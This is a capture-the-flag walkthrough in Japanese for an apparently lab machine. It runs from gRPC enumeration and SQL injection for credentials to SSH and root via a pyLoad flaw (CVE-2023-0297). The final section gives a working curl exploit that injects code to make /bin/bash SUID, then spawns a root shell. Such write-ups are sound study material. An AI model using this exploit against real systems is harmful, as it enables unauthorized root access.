#### nmap
![](/images/20230901054025.png)

Webにアクセスすると文字化けして表示されない
![](/images/20230901054100.png)

port50051について検索するとgRPCで使用されるポートらしい
https://documentation.softwareag.com/webmethods/compendiums/v10-11/C_API_Management/index.html#page/api-mgmt-comp/to-grpc_configuration_7.html

下のページにはSQL Injectionの脆弱性があることがかかれている
https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9

grpcを使うためのツールをダウンロードする
https://github.com/fullstorydev/grpcui/releases/tag/v1.3.1

```shell
./grpcui -plaintext 10.10.11.214:50051
```
![[Pasted image 20230901055146.png]]

コマンドを実行すると自動的にWebページが開く
![](/images/20230901055330.png)

デフォルトのユーザー名とパスワードを検索するとadmin/adminになっている
![](/images/20230901055439.png)

![](/images/20230901060439.png)


ID番号とtokenが表示されるのでこれを「getInfo」の画面で入力する
![](/images/20230901060635.png)

ここでBurp suiteを起動して受信する
（デフォルトのプロキシ設定ではうまく受信しなかったのでFoxyproxyを使った）
Repeateに送って検証する
![](/images/20230901061158.png)

「’」を入力してSQL Injectionの確認をする
200で帰ってくるので脆弱性があることが確認できる

![](/images/20230901203446.png)

![](/images/20230901204029.png)

union selectでユーザー名とパスワード表示させる
![](/images/20230901204310.png)

#### SSH接続

判明したユーザー名とパスワードでSSH接続をする

![](/images/20230901204530.png)

#### 権限昇格

「sudo -l」やlinpeas.shなどを試しても特に何も得られない
開いているポートを確認してみるとローカルで8000番ポートが開いているのが分かる
![](/images/20230901204809.png)

sshでローカルポートフォワーディングを実施する（新しいコンソールで実施した方が確実）
```shell
ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214
```

![](/images/20230901213316.png)

ブラウザに「127.0.0.1:8888」と入力すると「pyLoad」の画面が出てくる
![](/images/20230901213448.png)

pyloadのバージョンを確認する

![](/images/20230901213646.png)

「pyload 0.5.0 exploit」で検索するとRCEが見るかる
https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

このページの「Exploit Code」を編集して使う
実行後に「/bin/bash -p」を実行するとルートになれる
```shell
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20u%2Bs%20%2Fbin%2Fbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
```

```shell
/bin/bash -p
```

![](/images/20230901214029.png)

